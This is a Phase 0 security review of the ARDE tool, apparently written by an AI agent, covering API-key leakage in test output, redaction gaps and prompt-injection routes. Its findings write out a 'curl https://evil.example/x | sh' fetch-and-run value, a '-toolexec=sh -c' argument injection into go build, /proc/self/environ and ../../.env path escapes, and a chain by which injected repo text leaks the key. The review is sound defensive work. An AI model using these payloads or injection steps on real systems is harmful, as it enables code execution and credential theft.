# Phase 0 security review

Branch `phase-0` at `dc6239c`, reviewed 2026-11-02. I applied the `security-review` method by hand, because its template needs `origin/HEAD`, which this repo doesn't have. Only real or clearly dangerous issues with a concrete path are reported.

**Result: 0 Critical, 6 Important, 4 Minor.**

The production key path is sound. I found no route today from the key to a trace, log, report or exception text, and no route from model output to anything executed or written to source. The exposure now is in test output and in the key itself. Two Phase 0 types will open execution and file-read paths once Tasks 8, 12 and 13 consume them, and they are cheapest to fix now.

Each claim is labelled **measured** (I ran it, with a fake key and loopback only) or **reasoned** (from the code and plan, not run).

## Answers to the five questions

1. **Secrets.** The adapter holds on all 19 failure paths tried. Redaction is complete for exact matches, but it fails open and is exact-match only (M1). There is no guard against a future live test printing the key (I2), and `--showlocals` prints it from existing code (I3). The leaked key also looks unrotated (I1).
2. **Prompt injection.** Nothing reaches execution, source or a path today, because Phase 0 has no such sink. Later phases must close I4 and I5 and follow the list below.
3. **Boundary validation.** `yaml.safe_load` is the only YAML loader. There is no ReDoS in Phase 0: the shipped validators are linear, and `ExtractionPattern.call` is never compiled. `ARDE_MODELS_FILE` is operator-only and safe. The gap is that profile and evidence strings are unconstrained (I4, I5).
4. **Dependencies and hygiene.** `.env` is mode 600, ignored, and never tracked in any ref. `uv.lock` pins everything with hashes. No credential is committed, in the tree, in history or under `docs/research`. The one gap is M3.
5. **`docs/limitations.md`.** What it says is accurate, but it omits the risks a user most needs (I6).

## Important

### I1. The leaked key looks unrotated

- **Where:** `.env` (metadata only), and the Task 5 security entry in `progress.md`.
- **Path:** `progress.md` records that about 87 of the key's 106 characters reached an agent transcript and that Ionel was told to rotate it. `.env` was last modified at 2026-11-01 22:49:42 EET. Task 5 started after `6b68db1` (00:14:19 on Nov 2), so the file has not changed since before the leak.
- **Reading (inferred from the mtime):** either the leaked key is still in use, or it was revoked and `.env` holds a dead key. I did not read `.env` or call the API, so I can't tell which. The 19 missing characters make the fragment impractical to brute-force, so this is not an active compromise, but the fragment stays in those transcripts.
- **Fix:** rotate in the Console, update `.env`, run `make eval`, and record the date in `progress.md`. Add it to "How we know it's done" in `docs/specs/phase-0-foundations.md`, which has no such item.

### I2. Nothing stops the next live test printing the key

- **Where:** `tests/adapters/test_anthropic_live.py:106`, `pyproject.toml:45` (no `addopts`), and no `conftest.py` anywhere.
- **Path:** the incident fix was local to `Live`. Any test under `make eval` can read `os.environ["ANTHROPIC_API_KEY"]`, and Task 26 adds the next eval file (`tests/evals/test_classifier_eval.py`). If the key lands in a `str` field, a helper argument or a compared dict, the first failure prints it into the transcript of whichever agent ran the test.
- **Evidence (measured):** these three shapes printed the whole key in all five modes tried, including the plain `-q` that `make eval` uses.

| Shape | `-q` | `-l` | `--tb=long` | `--full-trace` | `-vv` |
|---|---|---|---|---|---|
| Dataclass with `api_key: str` (the original bug) | full | full | full | full | full |
| Key passed as a helper argument | full | full | full | full | full |
| Assertion on a dict holding the header | full | full | full | full | full |

- **Fix:** add a report scrubber in `tests/conftest.py`. A working prototype is at `/private/tmp/claude-501/-Users-ionel-work-personal-emag/0f37fc47-1c0a-42ed-bd77-f0a6f96a2ead/scratchpad/phase0_security/guard/conftest.py`. It uses `pytest_runtest_logreport` and matches any 16-character window of the key. Measured under `-q`, `-l` and `--tb=long`, it removed the whole key from a repr and from captured stdout, and it left a clean failure's message intact. Under `-q` it also removed a key truncated by `saferepr` (the incident shape). It does not cover `-s` or collection errors.
- **Pair it with:** pop the key from `os.environ` in `pytest_configure`, give tests a `SecretStr` through a fixture, and extend `tests/test_architecture.py` to fail on `get_secret_value` or `ANTHROPIC_API_KEY` reads outside the adapter and `conftest.py`. Test the guard with a failing inner pytest run.

### I3. `--showlocals` prints the key from code that exists today

- **Where:** `tests/adapters/test_anthropic_live.py:97` and `:106`, `src/arde/adapters/tracer.py:14`.
- **Path:** `anthropic_client.py:132-134` names `--showlocals` as a threat and keeps the key out of its own locals. The test helper and fixture still hold it in a plain local, and `JsonlTracer.__init__` takes it as a plain argument.
- **Evidence (measured, whole key printed):**

| Failure | `-q` | `-l` | `--tb=long` | `--full-trace` |
|---|---|---|---|---|
| Real `Live.assert_key_never_logged` fails on its request-id assertion | no | yes | no | no |
| Fixture of the same shape as `live`, key with a trailing newline | no | yes | no | no |
| `JsonlTracer` cannot create its run directory | no | yes | yes | yes |

- **Why it matters:** adding `-l` is the usual next step when a live test fails. The second row is the malformed key that `_malformed_key` exists to explain, so the failure most likely to send someone to `-l` is one that prints the key.
- **Fix:** never bind the plain value. Use `any(self.api_key.get_secret_value() in line for line in ...)`, build `SecretStr(os.environ[...])` inline after a presence check, and make the tracer take `tuple[SecretStr, ...]`.

### I4. Discovery output can become execution: `RepoProfile` has no trust boundary

- **Where:** `src/arde/domain/profile.py:15` and `:20-22`, `src/arde/domain/base.py:86-102`, `tests/adapters/test_anthropic_live.py:231`.
- **Today:** nothing executes. This opens at Tasks 8 and 12.
- **Route a, `extra_test_commands`.** A comment is the only thing keeping it from discovery. Measured: `RepoProfile.model_validate` accepts `curl https://evil.example/x | sh` from a tool input, the value survives a dump and reload (so it would persist in `profile.yaml`), and `strict_tool_schema(RepoProfile)` lists it as `required`, so that schema asks the model to fill it in. Plan line 647 says the submit schema has only `reported_test_commands`, but no type enforces that. The Task 5 note for Tasks 12 and 13 and the live test both already treat `RepoProfile` as the submit schema. Plan line 457 then runs whatever the profile holds.
- **Route b, `main_package`.** This plain `str` goes to `go build` in Task 8, and `validate_profile` runs that build ("It must build"). Measured on go1.27.1 with a root-package module: the single argv element `-toolexec=sh -c '...' --` ran the command with exit 0. No file in the repo was needed. The same value after `--` was refused and did not run, and `go build -o x -- .` still builds normally.
- **Consequence:** README or comment text can steer discovery into choosing a command, which breaks the design's anti-goal "LLM-chosen shell commands". Repo code runs in `go test` anyway, so this gives no new power to a repo whose code is malicious. It matters because it turns text, which nobody reviews as code, into execution.
- **Fix now:** split the type. `DiscoveredProfile` is the submit schema and what `profile.yaml` loads as. `RepoProfile` extends it with `extra_test_commands`, and only `merge_override` builds that. Give `main_package` a pattern that refuses a leading `-`, pass it after `--`, and point the live test at the new type.

### I5. Evidence paths are unconstrained, which gives a route from repo text to the API key

- **Where:** `src/arde/domain/facts.py:32` (`CodeQuote.file`), `:49` (`Links.files`), `src/arde/domain/profile.py:16` (`main_file`).
- **Today:** nothing reads them. This opens at Task 13.
- **Path (reasoned, Task 13 is not built):** the plan guards `read_file` (plan lines 595-596). `test_code_quote_must_exist_in_file` (line 677) and `quote_gone` (line 1193) are a second read of a model-chosen path, and no escape test is planned for them.
- **Measured pieces:** `CodeQuote(file="/proc/self/environ", quote="ANTHROPIC_API_KEY=sk-ant-a")` validates, `../../.env` validates, and `root / "/proc/self/environ"` discards `root`.
- **Chain:** in the container that file holds ARDE's own environment, including the key (not measured, this host is macOS). `validate_batch` returns rejections to the model as tool results, so accept or reject is a substring oracle over any file ARDE can read. An injected instruction can have the model test one candidate per fact, with many facts per call, and then carry the result into a fact, the docs, or an `http_probe` request to the repo's own service. Popping the key from `os.environ` does not help, because Linux keeps the initial block in `/proc/self/environ`.
- **Fix:** add a `RepoRelativePath` type to `domain/base.py` (relative, no `..`, no NUL) and use it for these fields. Use one shared `resolve()` and `is_relative_to(root)` helper in `repo_tools`, fact validation, `quote_gone` and the `main_file` check. Add the escape test to Task 13.

### I6. `docs/limitations.md` is accurate but misses the risks a user most needs

- **Where:** `docs/limitations.md:5-9`, `AGENTS.md:32`.
- **What is right:** lines 7-9 are honest about shared containers, the writable mount and the missing sandbox, and they mark reasoning as reasoning.
- **What is missing:**
  1. **Prompt injection.** "inject" appears in no wiki page. "Repos must be trusted" reads as being about running code, not about text. A poisoned comment can steer facts and docs, and line 31 already concedes that rules with no HTTP effect go unchecked.
  2. **Repo text goes to Anthropic.** Nothing says that whatever the agents read leaves the machine, including any secret committed to the target repo, and that it is also stored in `debug.log`.
  3. **Native runs have no container.** With `uv run arde` (design line 84), repo code runs as the developer with access to the home directory. Only `ANTHROPIC_*` is removed (design line 347), so `AWS_*`, `GITHUB_TOKEN` and the like reach repo code.
  4. **The shared volume.** R10 flagged the GOCACHE volume shared across repos, and the page doesn't mention it. It is wider than the cache: Task 28 puts `ARDE_HOME`, `GOCACHE` and `GOPATH` in one `/data` volume, owned by the same user as repo code. Repo A's tests could write repo B's `profile.override.yaml`, the very file `extra_test_commands` trusts (reasoned).
  5. **The redaction claim.** `AGENTS.md:32` says the key "never appears", which is stronger than exact-match redaction over two sinks (M1).
- **Fix:** add a "Prompt injection and data" section covering 1 to 3, extend "Trust and containers" with 4, and restate `AGENTS.md:32` as what the code does.

## Minor

### M1. Redaction fails open and is exact-match

`src/arde/adapters/tracer.py:14`, `:55-57`, `tests/adapters/test_tracer.py:166`. Measured: `JsonlTracer(dir, secrets=())` and `secrets=("   \n",)` are accepted, and the key then goes to `trace.jsonl` verbatim, so a wiring slip in Task 17 would be silent. The first 87 characters, base64 and a key split by a newline all pass unredacted. No path puts the key into the tracer today, so this needs a second fault. `report.json`, `service.log` and stderr don't go through the tracer at all, although plan line 42 promises them too. Fix: refuse an empty secret set at construction.

### M2. The kept cause still holds the key

`src/arde/adapters/llm/anthropic_client.py:309-312`, `tests/adapters/test_anthropic_client.py:794`. `ProviderError.__cause__.request.headers` holds `Authorization: Bearer <key>`. Its `repr` masks it, as the deferred note says, but `dict(headers)` does not (measured), so any reporter that walks exception attributes can reach it. The comment "A server's answer holds no credential" overclaims. The message already carries the status and request id, so the cause adds little. Fix: `raise failure from None`, drop the helper, and update the test.

### M3. `.gitignore:1` covers `.env` alone

`git check-ignore` confirms `.env.local` and `.env.bak` are not ignored. The repo is delivered as a GitHub link, and there is no secret scan or CI. Fix: `.env*` plus `!.env.example`.

### M4. Run files are world-readable

`src/arde/adapters/tracer.py:15`, `:65`. Measured under umask 022: directories 0755, `trace.jsonl` and `debug.log` 0644. `debug.log` holds full prompts and source (`agent_loop.py:62`), which matters for a native run on a shared host. Fix: create run directories with mode 0700.

## What later phases must be careful of

- **Task 8:** give child processes an allow-listed environment, not a copy minus `ANTHROPIC_*`.
- **Task 11, `grep`:** the model picks the pattern and the repo supplies the text. Measured in Python `re`: `(a+)+$` took 0.11s on 20 characters, 1.82s on 24 and 7.30s on 26. The turn limit and cost cap only run between tool calls, so nothing stops a stuck handler, and the plan has no timeout test. Use literal search, or a linear engine, or a subprocess with a timeout.
- **Task 12, patterns:** Go's RE2 is safe from ReDoS, but the spike's `MustCompile` (`patterns.go:53`) panics on bad syntax, and a Python `re.compile` check would accept syntax Go refuses. Validate in Go, cap the length, and reject negative `args`, which are accepted today.
- **Task 13:** `ProbeRecord.method` is free text and stored probes replay on every run. Allow GET and HEAD unless the override says otherwise.
- **Task 14:** the plan escapes `"` only (line 721). `ParamFact.default` and `enum` accept `)`, so `1) maximum(5` would add a swag attribute. Escape them or narrow the type.
- **Task 17:** wrap the key in `SecretStr` (already noted), and strip control characters before printing model or repo text. `SingleLine` accepts ESC, and `_unparsable_reply` quotes the model-controlled `loc`.
- **Task 28:** the spike Dockerfile pipes an unpinned uv installer through `sh` and uses an undigested base tag, while `test_tools_are_pinned` covers only swag and Go. Add a `.dockerignore` that excludes `.env`.
- **Task 29:** before publishing `examples/catalog-poc-run/`, scan for key fragments, not only the whole key.

## Checked and clean

| Check | Result |
|---|---|
| 9 HTTP statuses and 6 transport errors whose text quoted the key | `str`, `repr`, `format_exception`, captured locals and every chain link clean. A control on the raw SDK chain showed the key, so the probe can see a leak |
| 4 raw exceptions escaping the adapter (HTML body, wrong JSON shape, unserialisable message, lone surrogate) | Crash as non-`ArdeError`, but carry no key |
| `ProviderError` from a 401 reaching pytest | Clean in all five modes |
| `x-api-key` in `repr` | My hypothesis was wrong. SDK 2.3.0 sends `Authorization`, which `httpx2` masks |
| `ANTHROPIC_LOG=debug` on the real HTTP stack | A well-formed key appears 0 times. It appears only for a header the transport refuses, which `from_api_key` rejects first |
| Tracer on 10 surfaces (nested keys, bytes, sets, objects, exceptions, JSON and repr inside strings) | All redacted |
| `_summary` truncation | Never emits part of a key |
| Dangerous calls in `src` and `tests`, by AST scan | No `subprocess`, `eval`, `exec`, `pickle`, `yaml.load` or `shell=`. Every `re.compile` takes a constant. The only file operations in `src` are the tracer's writes and the models-file read |
| Model output sinks today | Only `trace.jsonl` (JSON-encoded), `debug.log`, tool results and error text |
| Shipped validators on 1 MB worst-case input | About 0.04s at worst |
| `ARDE_MODELS_FILE` on env-shaped files | `yaml.safe_load`, closed schema. 0 key characters in the message. 24 in the chained traceback for one shape, and only an operator can point it there |
| Key-shaped strings in tree, history, `.superpowers` and caches | Only fakes. The `.pyc` hit is `"sk-ant-" + "k" * 100`, constant-folded |
| `docs/research` | No credentials |
| `uv.lock` | 45 PyPI packages, all hashed, `uv lock --check` passes. `httpx2` is declared by `anthropic` itself |

## Not verified

- Whether the key was rotated. I did not read `.env`, and I did not open the transcripts holding the fragment.
- `/proc/self/environ` contents, because this host is macOS.
- Known CVEs in the locked versions: no advisory scan was run.
- SDK constructor failures. My invalid `ANTHROPIC_BASE_URL` scenario did not fail, so it proves nothing about the plain `api_key` argument in that frame.
- Live tests and `make eval` were not run.

The probes are in `/private/tmp/claude-501/-Users-ionel-work-personal-emag/0f37fc47-1c0a-42ed-bd77-f0a6f96a2ead/scratchpad/phase0_security`. `git status` was clean after they ran.
